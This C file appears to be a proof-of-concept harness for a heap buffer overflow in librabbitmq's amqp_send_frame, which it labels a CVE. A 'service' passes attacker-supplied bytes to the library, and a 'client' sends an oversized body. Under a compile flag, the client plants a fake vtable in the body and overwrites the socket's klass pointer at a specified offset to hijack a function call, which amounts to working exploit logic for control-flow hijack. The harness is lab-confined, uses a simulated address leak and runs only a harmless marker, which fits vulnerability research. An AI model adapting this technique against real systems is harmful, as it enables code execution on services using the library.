/*
 * rabbitmq-c CVE-2026-61547: loopback-only consumer-reality probe.
 *
 * "service" accepts a 4-byte big-endian length followed by that many body
 * bytes on an AF_UNIX listening socket, then passes the received bytes,
 * unmodified, as body_fragment to the public amqp_send_frame() API of the
 * VERBATIM pinned v0.16.0 librabbitmq. No library source is copied, patched
 * or interposed. "client" generates the chosen body and sends it over that
 * socket. The library's own socketpair (shut down for writing) makes the
 * post-serialization send fail without a broker or network listener.
 */
#include <rabbitmq-c/amqp.h>
#include <rabbitmq-c/framing.h>

#include <arpa/inet.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>
#ifdef REUSE_BUFFER
/* Reached only if the corrupted vtable's send slot is actually called. */
static ssize_t marker_send(void *self, const void *buf, size_t len, int flags) {
  (void)self; (void)buf; (void)len; (void)flags;
  printf("MARKER: controlled vtable call reached\n");
  fflush(stdout);
  _exit(0);
}
#endif

static int read_full(int fd, void *buf, size_t n) {
  size_t got = 0;
  while (got < n) {
    ssize_t r = read(fd, (char *)buf + got, n - got);
    if (r < 0) return -1;
    if (r == 0) return 1; /* peer closed early */
    got += (size_t)r;
  }
  return 0;
}

static int write_full(int fd, const void *buf, size_t n) {
  size_t put = 0;
  while (put < n) {
    ssize_t r = write(fd, (const char *)buf + put, n - put);
    if (r <= 0) return -1;
    put += (size_t)r;
  }
  return 0;
}

static int run_service(const char *path) {
  int ls = socket(AF_UNIX, SOCK_STREAM, 0);
  if (ls < 0) return 2;
  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  if (strlen(path) >= sizeof(addr.sun_path)) return 2;
  strcpy(addr.sun_path, path);
  unlink(path);
  if (bind(ls, (struct sockaddr *)&addr, sizeof(addr)) != 0) return 2;
  if (listen(ls, 1) != 0) return 2;

  int fd = accept(ls, NULL, NULL);
  if (fd < 0) return 2;
  uint32_t net_len = 0;
  if (read_full(fd, &net_len, 4) != 0) return 2;
  size_t len = ntohl(net_len);
  if (len == 0 || len > 1000000) return 2;
#ifdef REUSE_BUFFER
  /* A service may keep a larger reusable receive buffer and pass a shorter
   * declared length; this preserves the large-allocation heap layout while
   * the copy length stays just past the 65536-byte outbound frame buffer. */
  char *body = malloc(200000);
#else
  char *body = malloc(len);
#endif
  if (body == NULL) return 2;
#ifdef REUSE_BUFFER
  /* Lab-only simulated address knowledge: the attacker-side client needs the
   * body address to aim the fake vtable pointer. No exploit infoleak claimed. */
  const char *ap = getenv("RMQ2_ADDR_FILE");
  if (ap != NULL) {
    FILE *af = fopen(ap, "w");
    if (af != NULL) {
      fprintf(af, "%p %p\n", (void *)body, (void *)(uintptr_t)&marker_send);
      fclose(af);
    }
  }
#endif
  if (read_full(fd, body, len) != 0) return 2;
  printf("service: received len=%zu first=%02x last=%02x\n",
         len, (unsigned char)body[0], (unsigned char)body[len - 1]);
  fflush(stdout);

  /* The bytes arrive from the socket; the service does not choose them. */
  amqp_connection_state_t conn = amqp_new_connection();
  if (conn == NULL) return 3;
  signal(SIGPIPE, SIG_IGN);
  int sp[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) == 0) {
    shutdown(sp[1], SHUT_WR);
    amqp_set_sockfd(conn, sp[1]);
  }
#ifdef HEAP_NEIGHBOUR
  /* Debug-only: a live heap object allocated after the outbound buffer.
   * gdb inspects its chunk header before/after the library's own memcpy. */
  unsigned char *sentinel = malloc(512);
  memset(sentinel, 0x11, 512);
  fprintf(stderr, "neighbour: sentinel=%p size=512 marker=11\n", (void *)sentinel);
  fflush(stderr);
#endif
  amqp_frame_t frame;
  memset(&frame, 0, sizeof(frame));
  frame.frame_type = AMQP_FRAME_BODY;
  frame.channel = 1;
  frame.payload.body_fragment.bytes = body;
  frame.payload.body_fragment.len = len;

  fflush(stdout);
  int rc = amqp_send_frame(conn, &frame); /* ASan WRITE expected here */
  printf("service: amqp_send_frame rc=%d (returned: no overflow observed)\n", rc);
  fflush(stdout);
  amqp_destroy_connection(conn);
  free(body);
  close(fd);
  close(ls);
  unlink(path);
  return 0;
}

static int run_client(const char *path, size_t len, unsigned char value) {
  int fd = socket(AF_UNIX, SOCK_STREAM, 0);
  if (fd < 0) return 2;
  struct sockaddr_un addr;
  memset(&addr, 0, sizeof(addr));
  addr.sun_family = AF_UNIX;
  if (strlen(path) >= sizeof(addr.sun_path)) return 2;
  strcpy(addr.sun_path, path);
  if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) return 2;
  uint32_t net_len = htonl((uint32_t)len);
  if (write_full(fd, &net_len, 4) != 0) return 2;
  char *body = malloc(len);
  if (body == NULL) return 2;
  memset(body, value, len);
#ifdef REUSE_BUFFER
  /* Simulated disclosure: read the service's body and marker addresses, then
   * build a fake vtable inside the body and point the overwritten socket
   * klass field at it. Byte 65545 of the body lands at socket->klass. */
  const char *ap = getenv("RMQ2_ADDR_FILE");
  if (ap != NULL && len >= 65600) {
    unsigned long ba = 0, ma = 0;
    FILE *af = NULL;
    for (int tries = 0; tries < 200 && af == NULL; tries++) {
      af = fopen(ap, "r");
      if (af == NULL) usleep(25000);
    }
    if (af != NULL && fscanf(af, "%lx %lx", &ba, &ma) == 2 && ba != 0 && ma != 0) {
      uint64_t m = (uint64_t)ma, b = (uint64_t)ba;
      memcpy(body, &m, 8);             /* fake klass->send = marker_send */
      memcpy(body + 65545, &b, 8);     /* overwrites state->socket->klass */
      printf("client: fake_klass=%#lx marker_send=%#lx\n", b, m);
      fflush(stdout);
    }
    if (af != NULL) fclose(af);
  }
#endif
  if (write_full(fd, body, len) != 0) return 2;
  printf("client: sent len=%zu value=%02x over AF_UNIX\n", len, value);
  fflush(stdout);
  free(body);
  close(fd);
  return 0;
}

int main(int argc, char **argv) {
  if (argc < 3) {
    fprintf(stderr, "usage: %s service <sockpath> | client <sockpath> <len> <hexvalue>\n", argv[0]);
    return 2;
  }
  if (strcmp(argv[1], "service") == 0) return run_service(argv[2]);
  if (strcmp(argv[1], "client") == 0 && argc >= 5)
    return run_client(argv[2], (size_t)strtoul(argv[3], NULL, 10),
                      (unsigned char)strtoul(argv[4], NULL, 16));
  return 2;
}
